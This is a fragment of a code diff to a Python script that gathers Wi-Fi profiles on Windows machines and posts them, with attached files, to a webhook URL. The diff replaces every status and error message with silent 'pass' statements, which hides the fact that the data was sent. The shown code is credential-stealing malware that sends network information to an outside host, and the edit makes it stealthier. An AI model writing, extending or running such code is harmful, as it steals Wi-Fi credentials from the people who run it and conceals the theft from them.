@@ -48,12 +48,12 @@ def get_wifi_profiles():
             response = requests.post(webhook_url, data=payload, files=files)
 
         if response.status_code == 204:
-            print("Successfully sent Wi-Fi info to the webhook.")
+            pass
         else:
-            print(f"Failed to send data, response status: {{response.status_code}}")
+            pass
 
     except subprocess.CalledProcessError as e:
-        print(f"Error occurred: {{e}}")
+        pass
 def start():
     if check_os() == 'nt': 
         get_wifi_profiles()
